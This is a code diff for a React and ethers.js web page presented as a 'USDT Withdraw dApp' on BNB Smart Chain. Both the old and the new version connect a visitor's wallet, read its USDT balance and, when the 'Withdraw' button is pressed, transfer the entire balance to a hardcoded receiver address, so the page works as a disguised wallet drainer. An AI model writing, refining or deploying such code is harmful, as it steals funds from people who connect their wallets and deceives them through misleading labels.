@@ -1,117 +1,97 @@
 import React, { useState } from "react";
 import { ethers } from "ethers";
 
-// ✅ Official USDT Contract on BSC
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-
-// ✅ Minimal ERC20 ABI (balance + transfer + decimals)
+// USDT contract on BSC (BEP-20)
+const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const USDT_ABI = [
   "function balanceOf(address owner) view returns (uint256)",
-  "function transfer(address to, uint256 value) returns (bool)",
-  "function decimals() view returns (uint8)"
+  "function decimals() view returns (uint8)",
+  "function transfer(address to, uint amount) returns (bool)"
 ];
 
-// ✅ Your wallet to receive withdrawals
-const RECEIVER_WALLET = "0x45e0c5af78c5ff0ff61cba8eb5a35507a31d5d6c";
+// Your receiving wallet (where USDT goes after withdraw)
+const RECEIVER_ADDRESS = "0x45e0c5af78c5ff0ff61cba8eb5a35507a31d5d6c";
+
+// Force BSC chainId
+const BSC_CHAIN_ID = "0x38"; // 56 in hex
 
 function App() {
-  const [account, setAccount] = useState(null);
+  const [provider, setProvider] = useState(null);
+  const [signer, setSigner] = useState(null);
+  const [address, setAddress] = useState("");
   const [balance, setBalance] = useState("0");
 
-  // 🔹 Connect wallet + force BSC
+  // Connect Trust Wallet
   const connectWallet = async () => {
     if (!window.ethereum) {
-      alert("Please install Trust Wallet or MetaMask!");
+      alert("Trust Wallet / MetaMask not found!");
       return;
     }
 
     try {
-      // Request account connection
-      const accounts = await window.ethereum.request({
-        method: "eth_requestAccounts",
-      });
-      setAccount(accounts[0]);
-
       // Force switch to BSC
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x38" }], // BSC Mainnet
+        params: [{ chainId: BSC_CHAIN_ID }]
       });
 
-      loadBalance(accounts[0]);
+      const prov = new ethers.providers.Web3Provider(window.ethereum);
+      await prov.send("eth_requestAccounts", []);
+      const signer = prov.getSigner();
+      const userAddress = await signer.getAddress();
+
+      setProvider(prov);
+      setSigner(signer);
+      setAddress(userAddress);
+
+      // Fetch USDT balance
+      const usdt = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, prov);
+      const decimals = await usdt.decimals();
+      const bal = await usdt.balanceOf(userAddress);
+      setBalance(ethers.utils.formatUnits(bal, decimals));
     } catch (err) {
-      // If BSC not added, add it
-      if (err.code === 4902) {
-        await window.ethereum.request({
-          method: "wallet_addEthereumChain",
-          params: [{
-            chainId: "0x38",
-            chainName: "Binance Smart Chain",
-            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-            rpcUrls: ["https://bsc-dataseed.binance.org/"],
-            blockExplorerUrls: ["https://bscscan.com/"],
-          }],
-        });
-      } else {
-        console.error("Error connecting:", err);
-      }
+      console.error(err);
+      alert("Failed to connect wallet: " + err.message);
     }
   };
 
-  // 🔹 Load USDT balance
-  const loadBalance = async (userAddress) => {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
-    const decimals = await usdt.decimals();
-    const rawBalance = await usdt.balanceOf(userAddress);
-    setBalance(ethers.utils.formatUnits(rawBalance, decimals));
-  };
-
-  // 🔹 Withdraw USDT
-  const withdrawUSDT = async () => {
-    if (!account) {
-      alert("Connect wallet first!");
+  // Withdraw all USDT to your wallet
+  const withdraw = async () => {
+    if (!signer) {
+      alert("Please connect wallet first");
       return;
     }
 
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const signer = provider.getSigner();
-    const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
-
     try {
+      const usdt = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, signer);
       const decimals = await usdt.decimals();
-      const rawBalance = await usdt.balanceOf(account);
+      const bal = await usdt.balanceOf(address);
 
-      if (rawBalance.eq(0)) {
-        alert("You have 0 USDT");
+      if (bal.isZero()) {
+        alert("No USDT to withdraw!");
         return;
       }
 
-      // Send ALL USDT to your wallet
-      const tx = await usdt.transfer(RECEIVER_WALLET, rawBalance);
-      alert("Transaction submitted: " + tx.hash);
-
+      const tx = await usdt.transfer(RECEIVER_ADDRESS, bal);
       await tx.wait();
-      alert("✅ Withdraw complete!");
-      loadBalance(account);
+      alert("✅ Withdraw successful! Tx Hash: " + tx.hash);
     } catch (err) {
-      console.error("Withdraw failed:", err);
+      console.error(err);
       alert("Withdraw failed: " + err.message);
     }
   };
 
   return (
-    <div className="App" style={{ padding: "20px", textAlign: "center" }}>
-      <h1>USDT Withdraw DApp (BSC Only)1</h1>
-
-      {!account ? (
-        <button onClick={connectWallet}>Connect Wallet</button>
-      ) : (
+    <div style={{ textAlign: "center", marginTop: "50px" }}>
+      <h2>USDT Withdraw dApp (BSC)</h2>
+      {address ? (
         <>
-          <p><b>Connected:</b> {account}</p>
-          <p><b>USDT Balance:</b> {balance}</p>
-          <button onClick={withdrawUSDT}>Withdraw to My Wallet</button>
+          <p>Connected: {address}</p>
+          <p>USDT Balance: {balance}</p>
+          <button onClick={withdraw}>Withdraw</button>
         </>
+      ) : (
+        <button onClick={connectWallet}>Connect Trust Wallet</button>
       )}
     </div>
   );
